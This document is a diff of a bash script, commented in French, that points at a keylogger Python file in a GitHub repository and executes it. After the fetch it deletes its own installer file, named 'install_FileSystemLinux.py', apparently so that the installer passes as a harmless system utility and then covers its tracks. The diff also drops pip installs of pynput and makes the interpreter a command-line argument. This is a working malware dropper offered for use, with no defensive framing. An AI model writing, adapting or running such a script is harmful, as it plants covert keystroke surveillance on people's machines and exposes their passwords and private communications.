@@ -1,11 +1,4 @@
 #!/bin/bash
-pip install pynput
-pip install logging #installation de la librairie logging
-pip install pynput #installation de la librairie pynput
-
-
-
-
 
 # URL du fichier Python sur GitHub
 GITHUB_URL="https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/scriptKeylogger/keylogger.py"
@@ -27,9 +20,8 @@ fi
 
 
 
-
 # Exécution du fichier Python
 echo "Exécution du fichier Python..."
 OWNFILE="install_FileSystemLinux.py"
 rm $OWNFILE
-python3 keylogger.py
+$1 keylogger.py
